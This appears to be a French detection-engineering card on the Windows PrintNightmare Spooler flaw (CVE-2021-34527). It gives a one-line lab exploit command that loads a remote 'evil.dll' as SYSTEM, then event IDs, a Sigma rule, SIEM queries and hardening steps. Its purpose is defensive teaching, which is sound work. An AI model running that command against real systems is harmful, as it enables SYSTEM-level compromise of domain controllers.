# 46 — PrintNightmare (CVE-2021-34527)

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Privilege Escalation / Lateral Movement |
| **Technique MITRE** | T1068 |
| **Phase kill chain** | Privilege Escalation |
| **CVE** | **CVE-2021-34527 / CVE-2021-1675** |
| **Privilèges requis** | Un compte de domaine standard |
| **Impact** | Critique (RCE SYSTEM, y compris sur un DC) |

---

## 1. Description

**PrintNightmare** est une faille du **service Spooler d'impression** de Windows. La fonction `RpcAddPrinterDriverEx` permettait à un utilisateur authentifié de faire **charger un driver d'impression arbitraire** (un DLL malveillant) par le service Spooler, qui tourne en **SYSTEM**. Résultat : **exécution de code en SYSTEM**. Comme le Spooler tourne aussi sur les **DC**, un simple compte de domaine pouvait obtenir SYSTEM **sur un contrôleur de domaine** → compromission totale.

## 2. Prérequis
- Un compte de domaine standard.
- Service **Spooler** actif sur la cible (souvent par défaut, DC compris).
- Cible non patchée (correctifs mi-2021).

## 3. Procédure de simulation (lab)

```bash
# Charger un DLL malveillant via le Spooler distant
CVE-2021-1675.py datacorp.local/othmane:Marketing2025@10.0.0.10 '\\10.0.0.50\share\evil.dll'
# → exécution du DLL en SYSTEM sur la cible
```

## 4. Télémétrie générée (logs)

| Source | Event ID | Signification |
|--------|----------|---------------|
| **PrintService** | **808 / 316** | Échec/chargement de driver d'impression |
| Sysmon | 7 | Chargement d'un DLL par `spoolsv.exe` |
| Sysmon | 1 | `spoolsv.exe` engendre un processus enfant (cmd/powershell) |
| Security | 4688 | Création de processus par le Spooler |

**Anomalie clé :** `spoolsv.exe` qui **charge un DLL depuis un partage réseau** ou **lance un processus enfant** — comportement anormal pour un service d'impression.

## 5. Détection

### Règle Sigma
```yaml
title: PrintNightmare - Spooler Loads Remote DLL / Spawns Process
status: stable
logsource:
    product: windows
    category: image_load
detection:
    driver_load:
        Image|endswith: '\spoolsv.exe'
        ImageLoaded|contains: '\\\\'          # DLL depuis un partage réseau
    child_proc:
        ParentImage|endswith: '\spoolsv.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\rundll32.exe'
    condition: driver_load or child_proc
level: high
```

### Traduction SIEM
- **Elastic :** `process.parent.name:"spoolsv.exe" and process.name:("cmd.exe" or "powershell.exe")`
- **QRadar :** PrintService EID 808 + chargement DLL réseau par le Spooler.

## 6. Contre-mesures / Hardening
- **Patcher** (correctifs 2021).
- **Désactiver le service Spooler** sur les DC et serveurs sans impression.
- Restreindre `Point and Print` par GPO ; limiter le chargement de drivers aux admins.

## 7. Features pour l'agent IA
- `spoolsv.exe` chargeant un DLL depuis un chemin réseau (feature forte).
- `spoolsv.exe` comme parent d'un shell (relation parent-enfant anormale).
- Surtout critique si observé **sur un DC**.

## 8. Références
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
- https://github.com/cube0x0/CVE-2021-1675
